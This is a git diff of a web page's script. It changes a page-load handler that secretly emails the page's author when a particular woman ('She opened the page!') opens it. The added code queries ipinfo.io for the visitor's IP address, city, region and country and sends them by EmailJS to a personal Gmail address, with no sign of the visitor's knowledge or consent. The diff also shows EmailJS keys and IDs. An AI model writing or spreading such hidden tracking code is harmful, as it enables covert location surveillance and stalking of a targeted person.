@@ -175,20 +175,30 @@ function animateModel() {
 }
 
 document.addEventListener("DOMContentLoaded", function () {
-    emailjs.init("g68cD0jfv_Qzhryze"); // Updated Public Key
+    emailjs.init("g68cD0jfv_Qzhryze"); // Your Public Key
 
-    let templateParams = {
-        to_email: "techpc.u2005@gmail.com",
-        message: "She opened the page!"
-    };
+    fetch("https://ipinfo.io/json?token=YOUR_IPINFO_TOKEN") // Get IP Info
+        .then(response => response.json())
+        .then(data => {
+            let templateParams = {
+                to_email: "techpc.u2005@gmail.com", // Your Email
+                message: `She opened the page! 
+                IP: ${data.ip} 
+                City: ${data.city} 
+                Region: ${data.region} 
+                Country: ${data.country}`
+            };
 
-    emailjs.send("service_sklywbd", "template_qy6e6za", templateParams)
-        .then(function(response) {
-            console.log("Email sent!", response);
-        }, function(error) {
-            console.log("Failed to send email", error);
-        });
+            emailjs.send("service_sklywbd", "template_qy6e6za", templateParams)
+                .then(function(response) {
+                    console.log("Email sent!", response);
+                }, function(error) {
+                    console.log("Failed to send email", error);
+                });
+        })
+        .catch(error => console.log("Failed to get IP info", error));
 });
+
 
 
 
